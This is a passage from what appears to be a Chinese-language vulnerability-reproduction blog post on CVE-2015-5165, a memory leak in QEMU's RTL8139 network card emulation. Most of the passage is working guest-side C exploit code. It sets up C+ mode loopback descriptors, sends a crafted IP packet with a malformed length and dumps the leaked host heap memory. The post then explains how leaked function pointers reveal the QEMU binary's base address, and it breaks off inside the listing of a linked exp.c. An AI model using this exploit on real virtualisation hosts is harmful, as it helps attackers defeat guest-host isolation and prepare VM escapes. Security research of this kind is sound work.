only */</span></span><br><span class="line">    TxAddr0 = <span class="number">0x20</span>,  <span class="comment">/* Tx descriptors (also four 32bit). */</span></span><br><span class="line">    RxBuf = <span class="number">0x30</span>,</span><br><span class="line">    ChipCmd = <span class="number">0x37</span>,</span><br><span class="line">    RxBufPtr = <span class="number">0x38</span>,</span><br><span class="line">    RxBufAddr = <span class="number">0x3A</span>,</span><br><span class="line">    IntrMask = <span class="number">0x3C</span>,</span><br><span class="line">    IntrStatus = <span class="number">0x3E</span>,</span><br><span class="line">    TxConfig = <span class="number">0x40</span>,</span><br><span class="line">    RxConfig = <span class="number">0x44</span>,</span><br><span class="line">    Timer = <span class="number">0x48</span>,        <span class="comment">/* A general-purpose counter. */</span></span><br><span class="line">    RxMissed = <span class="number">0x4C</span>,    <span class="comment">/* 24 bits valid, write clears. */</span></span><br><span class="line">    Cfg9346 = <span class="number">0x50</span>,</span><br><span class="line">    Config0 = <span class="number">0x51</span>,</span><br><span class="line">    Config1 = <span class="number">0x52</span>,</span><br><span class="line">    FlashReg = <span class="number">0x54</span>,</span><br><span class="line">    MediaStatus = <span class="number">0x58</span>,</span><br><span class="line">    Config3 = <span class="number">0x59</span>,</span><br><span class="line">    Config4 = <span class="number">0x5A</span>,        <span class="comment">/* absent on RTL-8139A */</span></span><br><span class="line">    HltClk = <span class="number">0x5B</span>,</span><br><span class="line">    MultiIntr = <span class="number">0x5C</span>,</span><br><span class="line">    PCIRevisionID = <span class="number">0x5E</span>,</span><br><span class="line">    TxSummary = <span class="number">0x60</span>, <span class="comment">/* TSAD register. Transmit Status of All Descriptors*/</span></span><br><span class="line">    BasicModeCtrl = <span class="number">0x62</span>,</span><br><span class="line">    BasicModeStatus = <span class="number">0x64</span>,</span><br><span class="line">    NWayAdvert = <span class="number">0x66</span>,</span><br><span class="line">    NWayLPAR = <span class="number">0x68</span>,</span><br><span class="line">    NWayExpansion = <span class="number">0x6A</span>,</span><br><span class="line">    <span class="comment">/* Undocumented registers, but required for proper operation. */</span></span><br><span class="line">    FIFOTMS = <span class="number">0x70</span>,        <span class="comment">/* FIFO Control and test. */</span></span><br><span class="line">    CSCR = <span class="number">0x74</span>,        <span class="comment">/* Chip Status and Configuration Register. */</span></span><br><span class="line">    PARA78 = <span class="number">0x78</span>,</span><br><span class="line">    PARA7c = <span class="number">0x7c</span>,        <span class="comment">/* Magic transceiver parameter register. */</span></span><br><span class="line">    Config5 = <span class="number">0xD8</span>,        <span class="comment">/* absent on RTL-8139A */</span></span><br><span class="line">    <span class="comment">/* C+ mode */</span></span><br><span class="line">    TxPoll        = <span class="number">0xD9</span>,    <span class="comment">/* Tell chip to check Tx descriptors for work */</span></span><br><span class="line">    RxMaxSize    = <span class="number">0xDA</span>, <span class="comment">/* Max size of an Rx packet (8169 only) */</span></span><br><span class="line">    CpCmd        = <span class="number">0xE0</span>, <span class="comment">/* C+ Command register (C+ mode only) */</span></span><br><span class="line">    IntrMitigate    = <span class="number">0xE2</span>,    <span class="comment">/* rx/tx interrupt mitigation control */</span></span><br><span class="line">    RxRingAddrLO    = <span class="number">0xE4</span>, <span class="comment">/* 64-bit start addr of Rx ring */</span></span><br><span class="line">    RxRingAddrHI    = <span class="number">0xE8</span>, <span class="comment">/* 64-bit start addr of Rx ring */</span></span><br><span class="line">    TxThresh    = <span class="number">0xEC</span>, <span class="comment">/* Early Tx threshold */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bits in TxConfig. */</span></span><br><span class="line"><span class="keyword">enum</span> tx_config_bits &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Interframe Gap Time. Only TxIFG96 doesn&#x27;t violate IEEE 802.3 */</span></span><br><span class="line">        TxIFGShift = <span class="number">24</span>,</span><br><span class="line">        TxIFG84 = (<span class="number">0</span> &lt;&lt; TxIFGShift),    <span class="comment">/* 8.4us / 840ns (10 / 100Mbps) */</span></span><br><span class="line">        TxIFG88 = (<span class="number">1</span> &lt;&lt; TxIFGShift),    <span class="comment">/* 8.8us / 880ns (10 / 100Mbps) */</span></span><br><span class="line">        TxIFG92 = (<span class="number">2</span> &lt;&lt; TxIFGShift),    <span class="comment">/* 9.2us / 920ns (10 / 100Mbps) */</span></span><br><span class="line">        TxIFG96 = (<span class="number">3</span> &lt;&lt; TxIFGShift),    <span class="comment">/* 9.6us / 960ns (10 / 100Mbps) */</span></span><br><span class="line"></span><br><span class="line">    TxLoopBack = (<span class="number">1</span> &lt;&lt; <span class="number">18</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">17</span>), <span class="comment">/* enable loopback test mode */</span></span><br><span class="line">    TxCRC = (<span class="number">1</span> &lt;&lt; <span class="number">16</span>),    <span class="comment">/* DISABLE appending CRC to end of Tx packets */</span></span><br><span class="line">    TxClearAbt = (<span class="number">1</span> &lt;&lt; <span class="number">0</span>),    <span class="comment">/* Clear abort (WO) */</span></span><br><span class="line">    TxDMAShift = <span class="number">8</span>,        <span class="comment">/* DMA burst value (0-7) is shifted this many bits */</span></span><br><span class="line">    TxRetryShift = <span class="number">4</span>,    <span class="comment">/* TXRR value (0-15) is shifted this many bits */</span></span><br><span class="line"></span><br><span class="line">    TxVersionMask = <span class="number">0x7C800000</span>, <span class="comment">/* mask out version bits 30-26, 23 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bits in RxConfig. */</span></span><br><span class="line"><span class="keyword">enum</span> rx_mode_bits &#123;</span><br><span class="line">    AcceptErr = <span class="number">0x20</span>,</span><br><span class="line">    AcceptRunt = <span class="number">0x10</span>,</span><br><span class="line">    AcceptBroadcast = <span class="number">0x08</span>,</span><br><span class="line">    AcceptMulticast = <span class="number">0x04</span>,</span><br><span class="line">    AcceptMyPhys = <span class="number">0x02</span>,</span><br><span class="line">    AcceptAllPhys = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> ChipCmdBits &#123;</span><br><span class="line">    CmdReset = <span class="number">0x10</span>,</span><br><span class="line">    CmdRxEnb = <span class="number">0x08</span>,</span><br><span class="line">    CmdTxEnb = <span class="number">0x04</span>,</span><br><span class="line">    RxBufEmpty = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* C+ mode */</span></span><br><span class="line"><span class="keyword">enum</span> CplusCmdBits &#123;</span><br><span class="line">    CPlusRxVLAN   = <span class="number">0x0040</span>, <span class="comment">/* enable receive VLAN detagging */</span></span><br><span class="line">    CPlusRxChkSum = <span class="number">0x0020</span>, <span class="comment">/* enable receive checksum offloading */</span></span><br><span class="line">    CPlusRxEnb    = <span class="number">0x0002</span>,</span><br><span class="line">    CPlusTxEnb    = <span class="number">0x0001</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// big endian</span></span><br><span class="line"><span class="comment">// ethernet frame</span></span><br><span class="line"><span class="keyword">uint8_t</span> packet[] = &#123;</span><br><span class="line">    <span class="comment">/* 以太网帧 */</span></span><br><span class="line">    <span class="comment">// dst</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>,</span><br><span class="line">    <span class="comment">// src</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>,</span><br><span class="line">    <span class="comment">// 类型(代表IP协议)</span></span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x00</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* IP数据报 */</span></span><br><span class="line">    <span class="comment">// 版本和首部长度</span></span><br><span class="line">    (<span class="number">0x4</span> &lt;&lt; <span class="number">4</span>) | <span class="number">0x5</span>,</span><br><span class="line">    <span class="comment">// TOS</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// 总长度</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x13</span>,</span><br><span class="line">    <span class="comment">// 标识</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,</span><br><span class="line">    <span class="comment">// 标志(3bit)和片偏移(以8为基本单位，也就是相当于把标志的3bit当做0来计算)</span></span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// TTL</span></span><br><span class="line">    <span class="number">0x40</span>,</span><br><span class="line">    <span class="comment">// 上层协议，代表TCP</span></span><br><span class="line">    <span class="number">0x06</span>,</span><br><span class="line">    <span class="comment">// 首部校验和</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,</span><br><span class="line">    <span class="comment">// 源IP</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="comment">// 目的IP</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* TCP数据报 */</span></span><br><span class="line">    <span class="comment">// 源端口</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,</span><br><span class="line">    <span class="comment">// 目的端口</span></span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0xef</span>,</span><br><span class="line">    <span class="comment">// Sequence Number</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// Acknowledgement Number</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// 报头长度等</span></span><br><span class="line">    <span class="number">0x50</span>,</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="number">0x10</span>,</span><br><span class="line">    <span class="comment">// Window size</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xed</span>,</span><br><span class="line">    <span class="comment">// TCP checksum</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,</span><br><span class="line">    <span class="comment">// Urgent pointer</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx/Tx descriptor</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;rtl8139_desc;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx/Tx ring</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_ring</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> *<span class="title">desc</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *buffer;</span><br><span class="line">&#125;rtl8139_ring;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uint64_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PAGE_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PAGE_PFN;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | ((<span class="keyword">uint64_t</span>)addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_writeb</span><span class="params">(<span class="keyword">uint32_t</span> data, <span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outb(data, PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_writew</span><span class="params">(<span class="keyword">uint32_t</span> data, <span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outw(data, PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_writel</span><span class="params">(<span class="keyword">uint32_t</span> data, <span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(data, PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_readb</span><span class="params">(<span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inb(PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_readw</span><span class="params">(<span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inw(PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_readl</span><span class="params">(<span class="keyword">uint32_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(PMIO_BASE+port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_rx</span><span class="params">(rtl8139_ring *ring, rtl8139_desc *desc, <span class="keyword">size_t</span> nb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> buffer_size = RTL8139_BUFFER_SIZE + <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nb; ++i) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;desc[i], <span class="number">0</span>, <span class="keyword">sizeof</span>(desc[i]));</span><br><span class="line">        ring[i].desc = &amp;desc[i];</span><br><span class="line">        ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">memset</span>(ring[i].buffer, <span class="number">0</span>, buffer_size);</span><br><span class="line"></span><br><span class="line">        ring[i].desc-&gt;dw0 |= CP_RX_OWN;</span><br><span class="line">        ring[i].desc-&gt;dw0 |= buffer_size;</span><br><span class="line">        ring[i].desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(ring[i].buffer);</span><br><span class="line">        <span class="comment">// printf(&quot;buffer[%d]: 0x%x\n&quot;, i, ring[i].desc-&gt;buf_lo);  // for debug</span></span><br><span class="line">    &#125;</span><br><span class="line">    pmio_writel((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RxRingAddrLO);</span><br><span class="line">    pmio_writel(<span class="number">0</span>, RxRingAddrHI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_tx</span><span class="params">(rtl8139_desc *desc, <span class="keyword">void</span> *buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(rtl8139_desc));</span><br><span class="line">    desc-&gt;dw0 |= CP_TX_OWN  |</span><br><span class="line">                 CP_TX_EOR  |</span><br><span class="line">                 CP_TX_LS   |</span><br><span class="line">                 CP_TX_IPCS |</span><br><span class="line">                 CP_TX_TCPCS|</span><br><span class="line">                 CP_TX_LGSEN;</span><br><span class="line">    desc-&gt;dw0 |= RTL8139_BUFFER_SIZE;</span><br><span class="line">    desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(buffer);</span><br><span class="line">    pmio_writel((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), TxAddr0);</span><br><span class="line">    pmio_writel(<span class="number">0</span>, TxAddr0+<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_card_config</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_writel(TxLoopBack, TxConfig);</span><br><span class="line">    pmio_writel(AcceptMyPhys, RxConfig);</span><br><span class="line">    pmio_writew(CPlusRxEnb|CPlusTxEnb, CpCmd);</span><br><span class="line">    pmio_writeb(CmdRxEnb|CmdTxEnb, ChipCmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_packet_send</span><span class="params">(<span class="keyword">void</span> *buffer, <span class="keyword">void</span> *packet, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= RTL8139_BUFFER_SIZE) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(buffer, packet, len);</span><br><span class="line">        pmio_writeb(<span class="number">1</span>&lt;&lt;<span class="number">6</span>, TxPoll);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxd</span><span class="params">(<span class="keyword">uint8_t</span> *ptr, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; size; ++i, ++j) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">16</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n0x%08x: &quot;</span>, (<span class="keyword">uint32_t</span>)(ptr+i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, ptr[i]);</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">7</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 44*1500 = 66000 &gt; ip_data_len = 65535</span></span><br><span class="line">    <span class="keyword">size_t</span> rtl8139_rx_nb = <span class="number">44</span>;</span><br><span class="line">    rtl8139_ring *rtl8139_rx_ring;</span><br><span class="line">    rtl8139_desc *rtl8139_rx_desc, *rtl8139_tx_desc;</span><br><span class="line"></span><br><span class="line">    rtl8139_rx_ring = (rtl8139_ring *)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb*<span class="keyword">sizeof</span>(rtl8139_ring)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    rtl8139_rx_desc = (rtl8139_desc *)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb*<span class="keyword">sizeof</span>(rtl8139_desc)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    rtl8139_tx_desc = (rtl8139_desc *)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, <span class="keyword">sizeof</span>(rtl8139_desc)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc, rtl8139_rx_nb);</span><br><span class="line">    rtl8139_desc_config_tx(rtl8139_tx_desc, rtl8139_tx_buffer);</span><br><span class="line">    rtl8139_card_config();</span><br><span class="line">    rtl8139_packet_send(rtl8139_tx_buffer, packet, <span class="keyword">sizeof</span>(packet));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rtl8139_rx_nb; ++i) &#123;</span><br><span class="line">    <span class="comment">// for (int i = 0; i &lt; 2; ++i) &#123;</span></span><br><span class="line">        xxd((<span class="keyword">uint8_t</span> *)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>原文章[2]中通过这个漏洞获得了<code>qemu-system-x86_64</code>进程加载的基址，和为客户机所MMAP的内存基址。在我的复现环境中未能得到虚拟机内存的基址。下面说一下获得text基址的方法和我所做的一些尝试。</p>
<p>文章[2]在泄露的信息中搜索保存了<code>ObjectProperty</code>对象的堆块（可能是被释放的堆块），通过读取<code>ObjectProperty</code>中所保存的函数指针来泄露<code>qemu-system-x86_64</code>的基地址。</p>
<p>泄露的数据如下图：</p>
<p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20201205161404250.png" alt="image-20201205161404250"></p>
<p>此时进程<code>vmmap</code>如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x555555554000     0x5555555f2000 r--p    9e000 0      qemu-system-x86_64</span><br><span class="line">0x5555555f2000     0x5555559c9000 r-xp   3d7000 9e000  qemu-system-x86_64</span><br><span class="line">0x5555559c9000     0x555555b15000 r--p   14c000 475000 qemu-system-x86_64</span><br><span class="line">0x555555b15000     0x555555be0000 r--p    cb000 5c0000 qemu-system-x86_64</span><br><span class="line">0x555555be0000     0x555555c5e000 rw-p    7e000 68b000 qemu-system-x86_64</span><br><span class="line">0x555555c5e000     0x5555586bc000 rw-p  2a5e000 0      [heap]</span><br><span class="line"># .......    </span><br><span class="line">0x7fff93600000     0x7fffd3600000 rw-p 40000000 0    # MMAPED Memory: 1G</span><br><span class="line"># .......</span><br></pre></td></tr></table></figure>

<p>我是在泄露的信息中寻找形似函数指针的数据进行验证（在泄露的数据之中搜索<code>55 55 55</code>），验证是否为某函数（其实看函数名字，也就是<code>ObjectProperty</code>中的成员）。</p>
<p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/qemuleak.png" alt="qemuleak"></p>
<p>然后使用任意函数低12位地址进行匹配，减去其偏移得到基地址。</p>
<p>至于客户机内存基地址，在泄露的数据搜索<code>ff 7f</code>，没注意到与<code>0x7fff93600000     0x7fffd3600000 rw-p 40000000 0</code>有强烈关联的地址。而且在我这里，所分配的1G地址空间，低20位为0；网上exploit都是低24位为0的。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/clxsh/CVE/blob/main/CVE-2015-5165/exp.c">exp.c</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span 